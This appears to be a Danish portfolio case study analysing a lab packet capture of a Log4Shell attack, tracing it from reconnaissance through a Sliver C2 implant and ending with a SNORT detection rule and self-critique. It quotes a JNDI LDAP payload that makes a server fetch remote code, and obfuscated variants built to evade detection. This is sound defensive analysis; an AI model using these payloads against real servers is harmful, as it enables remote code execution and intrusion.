@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="da">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sag 02: Log4Shell fra exploit til C2 | Oliver Frost Harboe</title>
+<meta name="description" content="Analyse af en pakkefangst fra et Log4Shell-angreb, kortlagt fase for fase fra rekognoscering til etableret C2-kanal, og oversat til en SNORT-detektionsregel.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Source+Serif+4:opsz,wght@8..60,400;8..60,500;8..60,600;8..60,700&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../style.css">
+</head>
+<body>
+
+<header class="nav">
+  <div class="nav-inner">
+    <a href="../index.html" class="nav-name">Oliver Frost Harboe</a>
+    <ul class="nav-links">
+      <li><a class="backlink" href="../index.html#sager">← Alle sager</a></li>
+    </ul>
+  </div>
+</header>
+
+<div class="wrap case-hero">
+  <p class="eyebrow">Sag 02 — Netværksundersøgelse</p>
+  <h1>Log4Shell fra exploit til C2</h1>
+  <div class="case-facts">
+    <div><span class="label">Materiale</span><span class="value">Pakkefangst fra lab-miljø</span></div>
+    <div><span class="label">Min rolle</span><span class="value">Analyse og detektion</span></div>
+    <div><span class="label">Sårbarhed</span><span class="value">CVE-2021-44228</span></div>
+    <div><span class="label">Værktøjer</span><span class="value">Wireshark, SNORT</span></div>
+  </div>
+</div>
+
+<div class="wrap prose">
+
+  <h2>Kort</h2>
+  <p>En pakkefangst fra et kompromitteret miljø skulle analyseres. Der var ingen oplysninger om, hvad der var sket, kun rådata. Opgaven var at fastslå hvilken sårbarhed der var udnyttet, kortlægge hele angrebskæden fra første forespørgsel til etableret fjernadgang, og oversætte fundet til en regel, der kan fange angrebet næste gang.</p>
+  <p>Kort fortalt lykkedes angrebet. Angriberen kortlagde serveren, udnyttede Log4Shell, fik kode til at køre i hukommelsen og etablerede en vedvarende kanal ud af netværket. Nedenfor er hvordan det kunne aflæses af trafikken.</p>
+
+  <h2>Overblik først</h2>
+  <p>Jeg startede i Protocol Hierarchy frem for at filtrere efter noget bestemt. Man ved ikke hvad man leder efter, før man ved hvordan trafikken ser ud.</p>
+  <p>Trafikken kørte primært over IPv4 og TCP med lidt HTTP. Det interessante var fordelingen. HTTP udgjorde kun en lille del af TCP-pakkerne, mens en langt større mængde payload lå som uklassificeret "Data". Wireshark kunne ikke genkende protokollen, og det er i sig selv et signal. Legitim trafik plejer at ligne noget.</p>
+
+  <h2>Identifikation af sårbarheden</h2>
+  <p>Log4Shell udnytter, at Log4j automatisk evaluerer <code>${...}</code>-udtryk og udfører JNDI-opslag på det, der står indeni. Alt der logges, kan derfor blive eksekveret. Jeg søgte efter <code>${jndi</code> i pakkeindholdet og fik match på en HTTP-header:</p>
+  <pre class="code"><code>X-Api-Version: ${jndi:ldap://&lt;intern-ip&gt;:1389/a}</code></pre>
+  <p>Det er en direkte indikator. Serveren instrueres i at kontakte en LDAP-server, som angriberen kontrollerer.</p>
+  <p>Et payload i trafikken beviser dog kun et forsøg. For at afgøre om det lykkedes, filtrerede jeg på trafikken mod LDAP-porten. Der lå et fuldt TCP-handshake, data fra offerserveren og et LDAP-svar tilbage. Serveren ville kun kontakte den port, hvis Log4j faktisk evaluerede payloaden, så exploitet virkede.</p>
+
+  <h2>Angrebskæden</h2>
+
+  <div class="finding">
+    <p class="stepnote">Rekognoscering</p>
+    <p>Angriberen sendte en række GET-forespørgsler mod serveren. En forespørgsel mod <code>/api</code> returnerede <code>application/java-vm</code>, hvilket afslørede at serveren var Java-baseret. Det skete før exploitet, og det forklarer det næste valg.</p>
+  </div>
+
+  <div class="finding">
+    <p class="stepnote">Weaponization og levering</p>
+    <p>Payloaden blev placeret i <code>X-Api-Version</code> og sendt med curl. Placeringen er ikke tilfældig. Den følger direkte af rekognosceringen, fordi angriberen på det tidspunkt vidste, at der stod Java bag.</p>
+  </div>
+
+  <div class="finding">
+    <p class="stepnote">Installation</p>
+    <p>I stedet for at lægge en fil på disk leverede angriberen en Java-stager via LDAP-serveren, som hentede en payload direkte i hukommelsen. Da jeg fulgte den relevante TCP-strøm, fremgik felter som <code>sliverpb/sliver.proto</code>, <code>Envelope</code>, <code>Register</code>, <code>BeaconTasks</code>, <code>Hostname</code>, <code>Username</code>, <code>PID</code> og <code>UUID</code>. Det er den metadata, et Sliver-implantat sender ved første registrering.</p>
+  </div>
+
+  <div class="finding">
+    <p class="stepnote">Command and control</p>
+    <p>Derefter en vedvarende TCP-forbindelse på skiftende porte, domineret af ACK-pakker med længde nul i faste intervaller, altså beacon-trafik, afbrudt af PSH/ACK med binær payload der ikke matchede nogen kendt protokol. Sessionerne blev aldrig lukket.</p>
+  </div>
+
+  <div class="finding">
+    <p class="stepnote">Actions on objectives</p>
+    <p>Protobuf-beskederne i strømmen afslørede implantatets kapabiliteter: proceslistning og -terminering, filoverførsel begge veje, kommandoeksekvering, registry-manipulation, port forwarding og pivotering, screenshots og token-manipulation til privilege escalation. Fangsten viser ikke hver enkelt kommando, men den viser, hvad angriberen havde adgang til at gøre.</p>
+  </div>
+
+  <h2>Detektion</h2>
+  <p>Sidste led var at oversætte fundet til noget, der kan køre. En analyse der kun beskriver et angreb bagudrettet, forhindrer ikke det næste.</p>
+  <pre class="code"><code>alert tcp any any -&gt; $HTTP_SERVERS 80 (
+  msg:"LOG4SHELL - JNDI LDAP payload i HTTP-header";
+  flow:to_server,established;
+  content:"${jndi:"; http_header; nocase;
+  content:"ldap://"; http_header; nocase;
+  classtype:web-application-attack;
+  sid:1000001; rev:1;
+)</code></pre>
+
+  <h2>Hvad jeg ville gøre anderledes</h2>
+  <p><strong>Reglen matcher på den bogstavelige streng.</strong> Det er dens største svaghed. Log4Shell-payloads blev obfuskeret allerede få dage efter offentliggørelsen med varianter som <code>${${lower:j}ndi:</code>, <code>${${::-j}ndi:</code> og Unicode-escapes. Min regel fanger ingen af dem. En robust detektion skal matche på selve <code>${</code>-mønstret kombineret med et opslagsprotokolnavn, eller endnu bedre suppleres med adfærdsdetektion på udgående forbindelser til LDAP-porte fra webservere.</p>
+  <p><strong>Reglen dækker kun port 80 og kun HTTP-headere.</strong> Payloaden kan lige så godt ligge i URI, POST-body eller cookies, og applikationer kører på alle mulige porte. <code>$HTTP_PORTS</code> frem for <code>80</code> er minimum.</p>
+  <p><strong>Jeg skrev én regel til exploitet og ingen til de efterfølgende faser.</strong> Selve C2-trafikken er faktisk lettere at fange stabilt, fordi beacon-mønstret med faste intervaller og aldrig lukkede sessioner er svært for en angriber at skjule helt. En regel på det havde fanget angrebet, selv hvis exploitet var sluppet forbi.</p>
+  <p><strong>Jeg testede aldrig reglen mod normal trafik.</strong> Uden det ved jeg ikke, hvor mange falske positiver den giver. En regel der larmer, bliver slået fra, og så er den værre end ingen regel.</p>
+
+  <div class="case-foot">
+    <a class="btn" href="../index.html#sager">← Alle sager</a>
+    <a class="btn ghost" href="../index.html#kontakt">Kontakt mig</a>
+  </div>
+
+</div>
+
+<footer>
+  Oliver Frost Harboe — sidst opdateret august 2026
+</footer>
+
+</body>
+</html>
